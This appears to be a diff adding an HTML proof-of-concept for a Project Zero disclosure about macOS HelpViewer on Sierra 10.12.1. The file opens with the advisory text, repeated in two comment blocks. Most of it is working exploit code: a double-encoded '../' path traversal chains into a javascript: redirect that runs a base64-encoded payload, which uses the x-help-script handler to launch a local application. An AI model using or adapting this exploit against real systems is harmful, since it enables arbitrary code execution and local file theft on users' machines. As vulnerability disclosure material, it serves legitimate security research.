@@ -1,0 +1,69 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1040
+
+HelpViewer is an application and using WebView to show a help file.
+You can see it simply by the command:
+open /Applications/Safari.app/Contents/Resources/Safari.help
+
+or using "help:" scheme:
+help:openbook=com.apple.safari.help
+help:///Applications/Safari.app/Contents/Resources/Safari.help/Contents/Resources/index.html
+
+HelpViewer's WebView has an inside protocol handler "x-help-script" that could be used to open an arbitrary local file. Therefore if we can run arbitrary Javascript code, we'll win easily and, of course, we can read an arbitrary local file with a XMLHttpRequest.
+
+HelpViewer checks whether the path of the url is in a valid help file or not. But we can bypass this with a double encoded "../".
+
+PoC:
+document.location = "help:///Applications/Safari.app/Contents/Resources/Safari.help/%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f/System/Library/PrivateFrameworks/Tourist.framework/Versions/A/Resources/en.lproj/offline.html?redirect=javascript%253adocument.write(1)";
+
+The attached poc will pop up a Calculator.
+
+Tested on macOS Sierra 10.12.1 (16B2659).
+-->
+
+<script>
+
+/*
+OSX: HelpViewer XSS leads to arbitrary file execution and arbitrary file read.
+
+HelpViewer is an application and using WebView to show a help file.
+You can see it simply by the command:
+open /Applications/Safari.app/Contents/Resources/Safari.help
+
+or using "help:" scheme:
+help:openbook=com.apple.safari.help
+help:///Applications/Safari.app/Contents/Resources/Safari.help/Contents/Resources/index.html
+
+HelpViewer's WebView has an inside protocol handler "x-help-script" that could be used to open an arbitrary local file. Therefore if we can run arbitrary Javascript code, we'll win easily and, of course, we can read an arbitrary local file with a XMLHttpRequest.
+
+HelpViewer checks whether the path of the url is in a valid help file or not. But we can bypass this with a double encoded "../".
+
+PoC:
+document.location = "help:///Applications/Safari.app/Contents/Resources/Safari.help/%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f/System/Library/PrivateFrameworks/Tourist.framework/Versions/A/Resources/en.lproj/offline.html?redirect=javascript%253adocument.write(1)";
+
+The attached poc will pop up a Calculator.
+
+Tested on macOS Sierra 10.12.1 (16B2659).
+
+*/
+
+function main() {
+    function second() {
+        var f = document.createElement("iframe");
+        f.onload = () => {
+            f.contentDocument.location = "x-help-script://com.apple.machelp/scpt/OpnApp.scpt?:Applications:Calculator.app";
+        };
+
+        f.src = "help:openbook=com.apple.safari.help";
+
+        document.documentElement.appendChild(f);
+    }
+
+    var url = "javascript%253aeval(atob('" + btoa(second.toString()) + "'));\nsecond();";
+
+    document.location = "help:///Applications/Safari.app/Contents/Resources/Safari.help/%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f/System/Library/PrivateFrameworks/Tourist.framework/Versions/A/Resources/en.lproj/offline.html?redirect=" + url;
+}
+
+main();
+
+</script>
